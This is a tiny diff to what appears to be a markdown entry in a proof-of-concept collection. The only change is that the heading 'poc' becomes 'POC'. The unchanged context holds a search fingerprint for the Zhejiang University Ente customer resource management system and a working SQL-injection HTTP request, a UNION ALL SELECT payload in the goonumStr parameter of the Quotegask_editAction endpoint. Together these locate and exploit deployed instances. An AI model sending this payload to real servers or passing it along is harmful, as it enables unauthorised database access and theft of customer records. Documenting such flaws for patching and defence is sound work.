@@ -8,7 +8,7 @@
 app="浙大恩特客户资源管理系统"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+SELECT+user--+RMMS&method=goonumIsExist HTTP/1.1
